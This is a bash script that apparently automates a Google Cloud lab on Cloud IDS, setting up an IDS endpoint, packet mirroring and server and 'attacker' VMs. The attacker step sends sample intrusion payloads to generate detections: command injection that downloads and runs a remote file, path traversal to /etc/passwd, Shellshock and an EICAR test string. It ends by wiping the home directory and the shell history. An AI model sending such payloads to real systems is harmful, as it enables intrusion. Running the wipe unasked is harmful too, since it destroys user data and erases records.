BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
  
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 

${RESET}"
gcloud auth list
gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
export BUCKET_NAME=$(gcloud info --format='value(config.project)')
export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region us-central1
#gcloud config set compute/zone us-central1-a
export ZONE=us-east1-b



USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------#

export PROJECT_ID=$(gcloud config get-value project | sed '2d')
gcloud services enable servicenetworking.googleapis.com --project=$PROJECT_ID
gcloud services enable ids.googleapis.com --project=$PROJECT_ID
gcloud services enable logging.googleapis.com --project=$PROJECT_ID

echo "${GREEN}${BOLD}

Task 1 Completed

${RESET}"

gcloud compute networks create cloud-ids --subnet-mode=custom
gcloud compute networks subnets create cloud-ids-useast1 --range=192.168.10.0/24 --network=cloud-ids --region=us-east1
gcloud compute addresses create cloud-ids-ips \
--global \
--purpose=VPC_PEERING \
--addresses=10.10.10.0 \
--prefix-length=24 \
--description="Cloud IDS Range" \
--network=cloud-ids
gcloud services vpc-peerings connect \
--service=servicenetworking.googleapis.com \
--ranges=cloud-ids-ips \
--network=cloud-ids \
--project=$PROJECT_ID

echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"

gcloud ids endpoints create cloud-ids-east1 \
--network=cloud-ids \
--zone=us-east1-b \
--severity=INFORMATIONAL \
--async
gcloud ids endpoints list --project=$PROJECT_ID

echo "${GREEN}${BOLD}

Task 3 Completed

${RESET}"

gcloud compute firewall-rules create allow-http-icmp \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:80,icmp \
--source-ranges=0.0.0.0/0 \
--target-tags=server
gcloud compute firewall-rules create allow-iap-proxy \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:22 \
--source-ranges=35.235.240.0/20

echo "${GREEN}${BOLD}

Task 4 Completed

${RESET}"

gcloud compute routers create cr-cloud-ids-useast1 \
--region=us-east1 \
--network=cloud-ids
gcloud compute routers nats create nat-cloud-ids-useast1 \
--router=cr-cloud-ids-useast1 \
--router-region=us-east1 \
--auto-allocate-nat-external-ips \
--nat-all-subnet-ip-ranges

echo "${GREEN}${BOLD}

Task 5 Completed

${RESET}"

gcloud compute instances create server \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.20 \
--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
--tags=server \
--image=debian-10-buster-v20210512 \
--image-project=debian-cloud \
--boot-disk-size=10GB
gcloud compute instances create attacker \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.10 \
--image=debian-10-buster-v20210512 \
--image-project=debian-cloud \
--boot-disk-size=10GB

echo "${GREEN}${BOLD}

Task 6 Completed

${RESET}"


cat > server_ssh.sh <<EOF
sudo systemctl status nginx
cd /var/www/html/
sudo touch eicar.file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
rm *
exit

EOF
chmod +x server_ssh.sh
echo "${CYAN}${BOLD}

File permission granted to server_ssh.sh

${RESET}"

gcloud compute scp --zone=$ZONE --quiet server_ssh.sh server:~

#echo "${BLUE}${BOLD}  server_ssh.sh :↴↴↴"
#cat server_ssh.sh

echo "${RESET}${BG_RED}${BOLD}

Run this in server ssh:

./server_ssh.sh

${RESET}"

gcloud compute ssh server --zone=us-east1-b --quiet --tunnel-through-iap
echo "${YELLOW}${BOLD}

Back IN shell 

${RESET}"
gcloud ids endpoints list --project=$PROJECT_ID | grep STATE

echo "${RED}${BOLD}

Wait for Endpoints State to be ready

${RESET}"
ENDPOINT_STATE=$(gcloud ids endpoints list --project=$PROJECT_ID --format='value(STATE)')
echo $ENDPOINT_STATE
while [ $ENDPOINT_STATE = CREATING ];
do sleep 20 && ENDPOINT_STATE=$(gcloud ids endpoints list --project=$PROJECT_ID --format='value(STATE)') ;
echo $ENDPOINT_STATE
done

gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
echo $FORWARDING_RULE
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
--region=us-east1 \
--collector-ilb=$FORWARDING_RULE \
--network=cloud-ids \
--mirrored-subnets=cloud-ids-useast1

echo "${GREEN}${BOLD}

Task 7 Completed

${RESET}"

gcloud compute packet-mirrorings list


cat > attacker_ssh.sh <<EOF
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
rm *
exit

EOF

chmod +x attacker_ssh.sh
echo "${CYAN}${BOLD}

File permission granted to attacker_ssh.sh

${RESET}"

gcloud compute scp --zone=$ZONE --quiet attacker_ssh.sh attacker:~


echo "${RESET}${BG_RED}${BOLD}

Run this in server ssh:

./attacker_ssh.sh

${RESET}"

gcloud compute ssh attacker --zone=us-east1-b --quiet --tunnel-through-iap
echo "${YELLOW}${BOLD}

Back IN shell 

${RESET}"
#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${YELLOW}${BOLD}${YELLOW}Remove files?(y/n)" CONSENT_REMOVE && echo "${RESET}"

while [ $CONSENT_REMOVE = n ];
do sleep 20 && read -p "${BOLD}${YELLOW}Remove files?(y/n)" CONSENT_REMOVE  && echo "${RESET}";
done

echo "${YELLOW}${BOLD}
Removing files 
${RESET}"
rm -rfv $HOME/{*,.*}
rm $HOME/./.bash_history
